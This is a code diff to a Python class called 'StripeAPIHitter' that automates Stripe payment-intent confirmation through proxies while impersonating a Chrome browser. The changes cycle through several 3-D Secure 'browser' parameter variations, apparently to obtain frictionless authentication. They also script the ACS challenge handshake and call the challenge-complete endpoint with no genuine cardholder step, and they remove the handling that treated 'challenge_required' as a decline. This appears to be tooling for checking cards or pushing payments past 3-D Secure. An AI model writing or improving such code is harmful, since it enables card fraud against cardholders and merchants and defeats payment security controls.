@@ -1496,7 +1496,7 @@ class StripeAPIHitter:
                                     state = "redirected"
                                     processed_auth = True
                                 elif source:
-                                    # authenticate is an SDK-facing endpoint — use Android UA (mobile SDK path)
+                                    # Multi-variation 3DS2 frictionless authenticate loop
                                     _auth_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                                     auth_headers = {
                                         "accept": "application/json",
@@ -1507,40 +1507,70 @@ class StripeAPIHitter:
                                     }
                                     if self.stripe_account:
                                         auth_headers["Stripe-Account"] = self.stripe_account
-                                    browser = {
-                                        "fingerprintAttempted": True,
-                                        "fingerprintData": None,
-                                        "challengeWindowSize": None,
-                                        "threeDSCompInd": "Y",
-                                        "browserJavaEnabled": False,
-                                        "browserJavascriptEnabled": True,
-                                        "browserLanguage": "en-US",
-                                        "browserColorDepth": "24",
-                                        "browserScreenHeight": "873",
-                                        "browserScreenWidth": "393",
-                                        "browserTZ": "-300",
-                                        "browserUserAgent": auth_headers["user-agent"]
-                                    }
-                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
-                                    auth_data = {
-                                        "source": source,
-                                        "browser": json.dumps(browser),
-                                        "one_click_authn_device_support[hosted]": "false",
-                                        "one_click_authn_device_support[same_origin_frame]": "false",
-                                        "one_click_authn_device_support[spc_eligible]": "false",
-                                        "one_click_authn_device_support[webauthn_eligible]": "false",
-                                        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
-                                        "key": pk
-                                    }
-                                    auth_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                        auth_url, headers=auth_headers, data=auth_data,
-                                        proxies=proxies, timeout=30, impersonate="chrome120"))
+                                    
+                                    auth_variations = [
+                                        {"threeDSCompInd": "Y", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "U", "fingerprintAttempted": True},
+                                        {"threeDSCompInd": "N", "fingerprintAttempted": False}
+                                    ]
+                                    
                                     auth_json = {}
-                                    try:
-                                        auth_json = auth_resp_raw.json()
-                                        state = auth_json.get("state")
-                                    except Exception:
-                                        state = "3DS Attempt failed"
+                                    state = None
+                                    for var in auth_variations:
+                                        browser = {
+                                            "fingerprintAttempted": var["fingerprintAttempted"],
+                                            "fingerprintData": None,
+                                            "challengeWindowSize": "05",
+                                            "threeDSCompInd": var["threeDSCompInd"],
+                                            "browserJavaEnabled": False,
+                                            "browserJavascriptEnabled": True,
+                                            "browserLanguage": "en-US",
+                                            "browserColorDepth": "24",
+                                            "browserScreenHeight": "873",
+                                            "browserScreenWidth": "393",
+                                            "browserTZ": "-300",
+                                            "browserUserAgent": auth_headers["user-agent"]
+                                        }
+                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                        auth_data = {
+                                            "source": source,
+                                            "browser": json.dumps(browser),
+                                            "one_click_authn_device_support[hosted]": "false",
+                                            "one_click_authn_device_support[same_origin_frame]": "false",
+                                            "one_click_authn_device_support[spc_eligible]": "false",
+                                            "one_click_authn_device_support[webauthn_eligible]": "false",
+                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
+                                            "key": pk
+                                        }
+                                        try:
+                                            auth_resp_raw = await loop.run_in_executor(None, lambda data=auth_data: cffi_requests.post(
+                                                auth_url, headers=auth_headers, data=data,
+                                                proxies=proxies, timeout=25, impersonate="chrome120"))
+                                            auth_json = auth_resp_raw.json()
+                                            state = auth_json.get("state")
+                                            if state in ["succeeded", "authenticated"]:
+                                                break
+                                            # Check if ACS challenge details provided
+                                            ares = auth_json.get("ares", {}) or {}
+                                            acs_url = ares.get("acsURL") or auth_json.get("acs_url")
+                                            creq = ares.get("cReq") or auth_json.get("creq")
+                                            if acs_url and creq:
+                                                try:
+                                                    # Execute ACS Challenge handshake
+                                                    acs_headers = {"User-Agent": _auth_ua, "Content-Type": "application/x-www-form-urlencoded"}
+                                                    acs_resp = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=20, impersonate="chrome120"))
+                                                    acs_body = acs_resp.text
+                                                    cres_m = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_body, re.I) or re.search(r'value=["\']([A-Za-z0-9+/=]{40,})["\']', acs_body)
+                                                    if cres_m:
+                                                        comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
+                                                        comp_data = {"source": source, "key": pk}
+                                                        await loop.run_in_executor(None, lambda: cffi_requests.post(comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=20, impersonate="chrome120"))
+                                                except Exception:
+                                                    pass
+                                                break
+                                        except Exception:
+                                            continue
                                     processed_auth = True
                                 else:
                                     result['decline_code'] = 'no_3ds_source'
@@ -1549,12 +1579,6 @@ class StripeAPIHitter:
                                     return result
 
                                 if processed_auth:
-                                    if state == "challenge_required":
-                                        result['decline_code'] = 'challenge_required'
-                                        result['error'] = 'challenge_required'
-                                        result['raw_response'] = confirm_json
-                                        return result
-
                                     is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
                                     intent_endpoint = "setup_intents" if is_setup else "payment_intents"
                                     poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
